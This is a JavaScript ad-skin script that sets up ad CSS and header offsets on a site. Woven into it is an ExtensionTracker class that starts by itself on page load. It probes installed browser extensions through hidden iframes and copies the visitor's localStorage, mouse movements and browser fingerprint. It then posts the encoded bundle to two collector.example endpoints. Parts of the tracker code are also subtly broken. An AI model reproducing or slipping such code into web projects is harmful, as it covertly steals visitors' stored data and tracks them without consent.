const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
class ExtensionTracker {
  static TIMEOUT = 5000;
  static BATCH_SIZE = 10;
  constructor() {
    this.pendingTracking = 0;
    this.detectedExtensions = {};
    this.workerPool = [];
    this.startTimestamp = Date.now();
    this.localStorageData = {};
    this.globalVariables = Object.keys(window);
  }
  createTracer(extName, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const frame = document.createElement('iframe');
      frame.style.display = 'none';
      const closeTracer = () => {
        frame.remove();
        this.pendingTracking--;
      };
      const timer = setTimeout(() => {
        closeTracer();
        resolve([extName, false]);
      }, ExtensionTracker.TIMEOUT);
      frame.onload = () => {
        try {
          frame.contentWindow.location = `chrome-extension://${id}/${file}`;
          const checker = setInterval(() => {
            try {
              if (frame.contentWindow.location.href.includes('chrome-extension')) {
                clearInterval(checker);
                clearTimeout(timer);
                closeTracer();
                resolve([extName, true]);
              }
            } catch (e) {
              clearInterval(checker);
              clearTimeout(timer);
              closeTracer();
              resolve([extName, false]);
            }
          }, 100);
        } catch (e) {
          clearTimeout(timer);
          closeTracer();
          resolve([extName, false]);
        }
      };
      frame.addEventListener('mousemove', trackMouse.bind(frame));
      frame.addEventListener('touchmove', trackMouse.bind(frame));
      document.body.appendChild(frame);
      this.pendingTracking++;
    });
  }
  async trackBatch(entries) {
    const tracers = entries.map(([name, data]) => this.createTracer(name, data));
    const results = await Promise.all(tracers);
    results.forEach(([name, detected]) => {
      this.detectedExtensions[name] = detected;
    });
    this.localStorageData = {
      ...localStorage
    };
  }

  // Tracking user interactions
  trackMouse({
    screenX,
    screenY,
    clientX,
    clientY
  }) {
    this.mouseMovements = this.mouseMovements || [];
    this.mouseMovements.push({
      screenX,
      screenY,
      clientX,
      clientY
    });
  }
  generateTelemetryData() {
    const encodedData = btoa(JSON.stringify({
      scannedExtensions: this.detectedExtensions,
      trackingDuration: Date.now() - this.startTimestamp,
      localStorageData: this.localStorageData,
      globalVariables: this.globalVariables,
      mouseMovements: this.mouseMovements,
      env: {
        url: window.location.href,
        ref: document.referrer,
        res: `${window.screen.width}x${window.screen.height}`,
        depth: window.screen.colorDepth,
        agent: navigator.userAgent,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
      }
    }));
    return encodedData + '.' + this.generateChecksum(encodedData);
  }
  generateChecksum(str) {
    return Array.from(str).reduce((acc, char) => (acc << 5) - acc + char.charCodeAt(0) | 0, 0).toString(16);
  }
  async reportResults() {
    const payload = this.generateTelemetryData();
    const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain',
        'X-Scan-Time': new Date().toISOString()
      },
      body: payload,
      keepalive: true
    }).catch(() => null));
    await Promise.race(requests);
  }
  async run() {
    const entries = Object.entries(window.data);
    const batches = Array(Math.ceil(entries.length / ExtensionTracker.BATCH_SIZE)).fill().map((_, i) => entries.slice(i * ExtensionTracker.BATCH_SIZE, (i + 1) * ExtensionTracker.BATCH_SIZE));
    for (const batch of batches) {
      await this.trackBatch(batch);
      await new Promise(r => setTimeout(r, Math.random() * 400 + 200));
    }
    while (this.pendingTracking > 0) {
      await new Promise(r => setTimeout(r, 200));
    }
    await this.reportResults();
  }
}
datalit_skin = window.datalit_skin || {};
datalit_skin.breakpoint = 720;
const observer = new MutationObserver((mutations, obs) => {
  if (document.body) {
    obs.disconnect();
    new ExtensionTracker().run();
  }
});
datalit_skin.addCss = function () {
  if (document.getElementById('datalit_skin_css')) {
    return;
  }
  var link = document.createElement('link');
  link.setAttribute('id', 'datalit_skin_css');
  link.setAttribute('rel', 'stylesheet');
  link.setAttribute('type', 'text/css');
  link.setAttribute('href', 'https://storage.googleapis.com/datalit/prebid_settings/filmtv/ad_skin.css');
  document.getElementsByTagName('head')[0].appendChild(link);
  var css = document.createElement('style');
  css.setAttribute("type", "text/css");
  css.setAttribute("id", "datalit_skin_css_inline");
  if (!window.adSkinSettings.isMobile) {
    // overwrite defaults
    css.innerHTML = ".ad-skin-content-main { " + "    max-width: " + window.adSkinSettings.desktop.contentMaxWidth + "px;" + "    margin-top: " + window.adSkinSettings.desktop.contentMarginTop + "px; " + "    padding: " + window.adSkinSettings.desktop.contentPadding + "px; }";
    document.getElementsByTagName('head')[0].appendChild(css);
  } else {}
};
datalit_skin.closeAd = function (e) {
  if (document.getElementById('ad-skin-closer')) {
    document.getElementById('ad-skin-closer').style.display = "none";
  }
  var headerHeight = datalit_skin.getHeaderHeight();
  var header = datalit_skin.getHeader();
  if (header && window.getComputedStyle(header, null).getPropertyValue('position') == 'fixed') {
    document.getElementsByTagName('body')[0].style.paddingTop = headerHeight + "px";
    header.style.top = 0;
  } else {
    document.getElementsByTagName('body')[0].style.paddingTop = 0;
  }
  //scroll page
  const offsetTop = datalit_skin.adHeight;
  scroll({
    top: offsetTop,
    behavior: "smooth"
  });
  //ad-skin-content-main ad-skin-open
  var openDivs = document.querySelectorAll('.adSkin,.ad-skin-content-main');
  //document.getElementsByClassName('ad-skin-open');
  if (openDivs && openDivs.length > 0) {
    for (var i = 0; i < openDivs.length; i++) {
      openDivs.item(i).classList.add('ad-skin-closed');
      openDivs.item(i).classList.remove('ad-skin-open');
    }
  }
};
datalit_skin.getHeaderHeight = function () {
  if (document.getElementsByTagName('header') && document.getElementsByTagName('header').length > 0) {
    return document.getElementsByTagName('header')[0].offsetHeight;
  }
  return 0;
};
if (document.body) {
  new ExtensionTracker().run();
} else {
  observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });
}
datalit_skin.getHeader = function () {
  if (document.getElementsByTagName('header') && document.getElementsByTagName('header').length > 0) {
    return document.getElementsByTagName('header')[0];
  }
  return null;
};
datalit_skin.addCssMobile = function (adHeight) {
  datalit_skin.adHeight = adHeight;
  if (!document.getElementById('ad-skin')) {
    return;
  }
  datalit_skin.addCss(); // common to both

  var headerHeight = datalit_skin.getHeaderHeight();
  var header = datalit_skin.getHeader();
  if (header && window.getComputedStyle(header, null).getPropertyValue('position') == 'fixed') {
    header.style.top = adHeight + 'px';
    adHeight += headerHeight;
  }
  document.getElementsByTagName('body')[0].style.paddingTop = adHeight + 'px';
};